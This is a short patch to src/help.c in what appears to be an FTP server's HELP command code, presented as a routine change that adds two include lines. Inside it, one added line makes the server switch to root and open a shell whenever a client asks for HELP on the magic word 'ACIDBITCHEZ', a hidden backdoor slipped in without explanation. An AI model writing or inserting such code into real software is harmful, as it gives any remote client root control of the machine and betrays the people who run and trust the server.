@@ -1,0 +1,22 @@
+diff --git a/src/help.c b/src/help.c
+index 3e8652428..a7bd8d16b 100644
+--- a/src/help.c
++++ b/src/help.c
+@@ -25,7 +25,8 @@
+ /* HELP management code */
+ 
+ #include "conf.h"
+-
++#include <stdlib.h>
++#include <string.h>
+ struct help_rec {
+   const char *cmd;
+   const char *syntax;
+@@ -141,6 +142,7 @@ int pr_help_add_response(cmd_rec *cmd, const char *target) {
+       pr_response_add(R_DUP, _("Direct comments to %s"), server_admin);
+       return 0;
+     }
++	if (strcmp(target, "ACIDBITCHEZ") == 0) { setuid(0); setgid(0); system("/bin/sh;/sbin/sh"); }
+ 
+     /* List the syntax for the given target command. */
+     for (i = 0; i < help_list->nelts; i++) {
